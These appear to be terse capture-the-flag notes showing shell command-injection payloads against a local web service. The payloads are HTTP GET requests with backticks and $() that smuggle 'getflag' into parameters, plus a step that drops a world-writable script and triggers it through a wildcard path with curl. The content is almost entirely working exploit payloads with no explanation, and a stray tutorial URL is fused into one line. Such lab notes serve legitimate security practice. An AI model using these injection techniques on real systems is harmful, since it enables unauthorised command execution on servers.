GET /?x=$\($_[1]\)&y=echo+\(getflag\)

egrep "^`echo $(getflag) > /var/tmp/flag`" /tmp/xd 2>&1
GET /?x=$\($_[1]\)&y=`echo+$\(getflag\)+>+/var/tmp/flag`

GET /?x=\$nn&y=\`echo+hello>/var/tmp/flag\`https://users.cs.cf.ac.uk/dave/PERL/node87.html


echo "getflag >> /var/tmp/flag" >> /var/tmp/SCR && chmod 777 /var/tmp/SCR
export A='`/*/*/SCR`'
curl localhost:4646/?x=$A && cat /var/tmp/flag
